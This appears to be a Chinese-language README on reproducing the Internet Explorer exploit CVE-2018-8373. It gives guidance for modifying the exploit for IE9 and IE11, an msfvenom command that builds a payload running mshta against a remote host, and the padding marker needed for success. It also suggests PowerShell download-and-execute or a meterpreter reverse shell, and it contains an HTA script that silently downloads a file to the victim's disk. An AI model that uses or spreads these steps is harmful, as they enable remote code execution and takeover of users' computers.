# CVE-2018-8373 REC


`怎样修改Exploit`
    
    BeforeIE9是可以对IE9之前的版本进行利用，但是在有些X64位机器上不行
    
    BeforeIE11是比较好用的，可以针对IE11之前的版本进行利用
    
    IE11 修改与CVE-2018-8174修改差不多  在165行左右 填充msf生成的payload即可

`怎样使用`
    
    IE9可以直接执行命令 调用Powershell下载执行即可
    
    IE11可以使用msf的powershell meterpreter模块反弹 也可以将下载命令使用msf编码执行

`复现注意事项`
    
    我的知乎专栏 MSF文章
    https://zhuanlan.zhihu.com/p/40091321
    生成 执行命令的payload 这个位置生成的payload是用来填充的
    msfvenom -p windows/exec cmd='mshta http://192.168.0.100:6666/hFmjv' -f js_le exitfunc=thread 
    
    填充payload的时候要注意，与8174有一点不同
    
    就是不是全填充而是在 原来的地方要修改  具体看修改  
    
    要保留如下字符串 然后在这个字符串之前填充  不然是无法复现成功的
   
    %u4100%u0065%u0000%u0000%u0000%u0000%u0000%ucc00%ucccc%ucccc%ucccc%ucccc
    
    我从官网即时下载的IE11也存在问题，所以危害还是很大的。。
    
    
# 下载文件
    
    
    <html>
    <head>
    <script>
    var Object = new ActiveXObject("MSXML2.XMLHTTP");
    Object.open("GET","http://192.168.206.101/demo.php.zip",false);
    Object.send();
    if (Object.Status == 200)
    {
        var Stream = new ActiveXObject("ADODB.Stream");
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.SaveToFile("C:\\demo.zip", 2);
        Stream.Close();
    }
    window.close();
    </script>
    <HTA:APPLICATION ShowInTaskbar = No>
    WINDOWSTATE = "minimize">
    </head>
    <body>
    </body>
    </html>
    
    

## 最后感谢看雪大佬提供的EXP。



